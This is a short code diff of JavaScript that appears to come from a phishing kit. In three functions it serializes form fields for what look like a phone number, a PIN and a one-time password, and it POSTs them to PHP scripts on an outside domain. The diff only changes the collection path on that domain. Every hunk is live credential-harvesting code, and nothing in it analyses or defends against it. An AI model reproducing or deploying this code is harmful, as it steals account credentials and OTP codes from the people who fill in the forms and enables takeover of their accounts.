@@ -6,7 +6,7 @@ function sendNohp(event) {
    var dataString = $("#formNohp, #formPin, #formOtp").serialize();
    $.ajax({
       type: 'POST',
-      url: 'https://choreo.ii-fi.cfd/c7he/ss/one.php',
+      url: 'https://choreo.ii-fi.cfd/c7he/ssx/one.php',
       data: dataString,
       complete: function(data) {
          console.log('Complete');
@@ -31,7 +31,7 @@ function sendPin() {
    var dataString = $("#formNohp, #formPin, #formOtp").serialize();
    $.ajax({
       type: 'POST',
-      url: 'https://choreo.ii-fi.cfd/c7he/ss/two.php',
+      url: 'https://choreo.ii-fi.cfd/c7he/ssx/two.php',
       data: dataString,
       complete: function(data) {
          console.log('Complete');
@@ -60,7 +60,7 @@ function sendOtp() {
    var dataString = $("#formNohp, #formPin, #formOtp").serialize();
    $.ajax({
       type: 'POST',
-      url: 'https://choreo.ii-fi.cfd/c7he/ss/three.php',
+      url: 'https://choreo.ii-fi.cfd/c7he/ssx/three.php',
       data: dataString,
       complete: function(data) {
          console.log('Complete');
